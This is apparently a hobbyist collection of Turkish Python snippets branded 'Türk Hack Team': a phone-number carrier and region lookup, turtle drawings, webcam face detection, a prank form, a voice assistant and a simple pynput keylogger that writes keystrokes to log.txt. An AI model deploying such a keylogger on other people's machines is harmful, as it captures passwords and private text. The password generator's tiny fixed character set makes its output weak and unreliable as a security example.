# Numara Lokasyon Tespit
'''import phonenumbers
from phonenumbers import carrier, geocoder, timezone
number = input("Telefon Numarasını  Gir: ")

if number.startswith("+"):
    print("Numara Doğru!")
    Numara = phonenumbers.parse(number)
    zaman = timezone.time_zones_for_number(Numara)
    sim_adi = carrier.name_for_number(Numara, "tr")
    bolge = geocoder.description_for_number(Numara, "tr")

    print("Saat Dilimi :", zaman)
    print("Sim adı:", sim_adi)
    print("Yaşadığı Ülke(bölge) :", bolge)

else:
    print("+ülke kodunu kullanarak giriniz.")'''


# Şifre Oluşturucu
'''
import time
import random

print("*"*80)
print("Türk Hack Team")
print("*"*80)
print("Hoşgeldiniz devam etmek için 1 yazın. --Türk Hack Team")
deger = int(input(": "))
if deger == 1:
    print("Lütfen bekleyin.")
else:
    print("Lütfen 1 yazınız")

time.sleep(2)
print("*"*80)
print("Hazırlanıyor...")
print("*"*80)
time.sleep(5)
print("Hazır!")
print("*"*80)

lower = "K!!tçerhsjaws@whjgyuerwrer"
upper = "Pa!@sEoerDFJasfdf"
numbers = "!12!!@6789"
symbols = "!@"

string = lower + upper + numbers + symbols
length = 10
password = "".join(random.sample(string,length))

print("Şifre: " + password)'''


# Klavyeden Girilen tuşları tespit eder
'''
import pynput

from pynput.keyboard import Key,Listener

count = 0
keys = []

def on_press(key):
    global count,keys
    count += 1
    print("{0} pressed".format(key))
    keys.append(key)

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt" , "a" , encoding="utf-8") as file:
        for key in keys:

            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)


def on_release(key):
    if key == Key.esc:
        print("exit")
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()'''


# Kırık Kalp Çizimi
'''
from turtle import*
bgcolor('black')
color('red')
begin_fill()
pensize(3)
left(50)
forward(133)
circle(50,200)
right(140)
circle(50,200)
forward(133)
end_fill()

penup()
goto(0,155)
pendown()
pencolor('black')
width(4)
fd(10)
right(70)
fd(20)
left(60)
fd(30)
right(70)
fd(30)
left(70)
fd(50)
right(55)
fd(50)
hideturtle()
done()'''


# Yüz ve göz algılama
'''import cv2
kamera=cv2.VideoCapture(0)
yuz_casc=cv2.CascadeClassifier("haarcascade_frontalface_default.xml")
goz_casc=cv2.CascadeClassifier("haarcascade_eye.xml")


while True:
	_,goruntu=kamera.read()

	griTon=cv2.cvtColor(goruntu,cv2.COLOR_BGR2GRAY)
	yuzler=yuz_casc.detectMultiScale(griTon,1.3,5)
	for (x,y,w,h) in yuzler:
		cv2.rectangle(goruntu,(x,y),(x+w,y+h),(0,255,0),3)
		roi_griTon=griTon[y:y+h,x:x+w]
		roi_renkli=goruntu[y:y+h,x:x+w]
		gozler=goz_casc.detectMultiScale(roi_griTon)
		for (ex,ey,ew,eh) in gozler:
			cv2.rectangle(roi_renkli,(ex,ey),(ex+ew,ey+eh),(0,0,255),3)

	cv2.imshow("Orjinal",goruntu)
	if cv2.waitKey(1)==ord("q"):
		break;

kamera.release()
cv2.destroyAllWindows()
'''


# Aptal mısın formu
'''from tkinter import *
from random import choice

def Evet():
    soru.destroy()
    bildim = Label(text="Bunu biliyordum :3")
    bildim.pack()

def Hayır():
    xx = [250,230,270,290,280,240]
    yy = [60,70,40,30,80]
    hayir.place(x=choice(xx), y=choice(yy))
pencere = Tk()
soru  = Label(text="Aptal mısın?")
evet = Button(text="Evet", command=Evet)
hayir = Button(text="Hayır", command=Hayır)
pencere.geometry("400x130")
evet.place(x=40,y=50,width=80)
hayir.place(x=260,y=50,width=80)
soru.pack()
pencere.mainloop()'''


# Animasyonlu giriş
'''import random, time, sys
from colorama import *

init(autoreset=True)
fr = Fore.RED
fb = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN


def logo():
	clear = "\x1b[0m"
	colors = [36, 32, 34, 35, 31, 37]

	x = """

               __   ________      _   _      ______
               \ \ / /____  |    | \ | |    |  ____|
                \ V /    / /_____|  \| | ___| |__  
                 > <    / /______| . ` |/ _ \ __|  
                / . \ / /       | |\ |  __/ |    
               /_/ \_\/_/        |_| \_|\___|_|  

                       |  Coded by X7-NeF  |                      

       +-------- TurkHackTeam | turkhackteam.org --------+

                                          """
	for N, line in enumerate(x.split("\n")):
		sys.stdout.write(" \x1b[1;%dm%s%s\n " % (random.choice(colors), line, clear))
		time.sleep(0.06)


logo()'''


# Windows logo çizimi
'''import turtle
turtle.speed(1)
turtle.bgcolor('black')
turtle.penup()
turtle.goto(-50, 60)
turtle.pendown()
turtle.color('blue')
turtle.begin_fill()
turtle.goto(100, 100)
turtle.goto(100, -100)

turtle.goto(-50, -60)
turtle.goto(-50, 60)
turtle.end_fill()
turtle.color('black')
turtle.goto(15, 100)

turtle.color('black')
turtle.width(10)
turtle.goto(15, -100)
turtle.penup()
turtle.goto(100, 0)
turtle.pendown()
turtle.goto(-100, 0)
turtle.done()'''


# Türk bayrağı çizimi
'''import turtle

t = turtle.Turtle()
w = turtle.Screen()
w.title("57.ALAY KÜLÜBÜ")
w.setup(width=720,height=420)
w.bgcolor("red")

# İlk daire
t.up()
t.goto(-100,-100)
t.color('white')
t.begin_fill()
t.circle(120)
t.end_fill()

t.goto(-70,-80)
t.color('red')
t.begin_fill()
t.circle(100)
t.end_fill()


t.goto(0,35)
t.fillcolor("white")
t.begin_fill()

for i in range(5):
    t.forward(150)
    t.right(144)
t.end_fill()

t.goto(-130,-190)
t.color("white")
t.write("BY Alexxb ", font=("Verdana", 17,"bold"))

t.goto(-999,-0)


w.exitonclick()'''


# Sesli asistan
'''
from datetime import datetime
import webbrowser
import speech_recognition as sr
import time
from gtts import gTTS as gt
from playsound import playsound as ps
import random
import os

catch = sr.Recognizer()

def record(ask = False):

    with sr.Microphone() as source:
        if ask:
            speak(ask)
        audio = catch.listen(source)
        voice = ""
        try:
            voice = catch.recognize_google(audio , language="tr-TR")
        except sr.RequestError:
            speak("Bir hata oldu")
        except sr.UnknownValueError:
            speak("Bana bu kelimeyi öğretmediniz")
        return voice

def response(voice):
    if "maymun" in voice:
        speak("Efendim, berkant")
    if "nasılsın" in voice:
        speak("Teşekkürler, sen nasılsın")
    if "Sen kimsin" in voice:
        speak("benim ismim maymun beni berkant tasarladı")
    if "hayat nasıl gidiyor" in voice:
        speak("doğumumdan gecen sürede daha pek bir şey yaşıyamadım")
    if "saat kaç" in voice:
        speak(datetime.now())
    if "arama yap" in voice:
        search = record("ne arama yapmak istiyorsun")
        url = "https://google.com/search?q= " + search
        webbrowser.get().open(url)
        print(search + " için bulduklarım")
    if "bilgi ver" in voice:
        speak("Ne hakkında bilgi vermemi istiyorsun")
    #if "açık kaynak kodlarını gösterir misin"
        #speak("Tabi ki")
        #subprocces.call(["cd Destkop/","cd bin/","./pycharm.sh"])
    if "maymun kapan" in voice:
        speak("görüşürüz berkant")
        exit()

def speak(string):
    tts = gt(string,lang="tr")
    rand = random.randint(1,10000)
    file = "audio-"+str(rand)+".mp3"
    tts.save(file)
    ps(file)
    os.remove(file)


speak("Nasıl Yardımcı Olabilirim")
time.sleep(1)
while 1:
    voice = record()
    print(voice)
    response(voice)
'''